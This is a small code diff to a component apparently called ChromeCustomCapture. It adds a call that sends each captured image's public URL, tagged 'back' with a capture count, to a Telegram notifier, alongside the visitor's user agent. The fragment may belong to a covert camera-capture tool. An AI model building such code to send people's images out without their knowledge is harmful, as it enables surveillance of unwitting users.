@@ -207,6 +207,7 @@ const ChromeCustomCapture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
             });
+            notifyTelegram(urlData.publicUrl, 'back', captureCount);
           }
         }
 
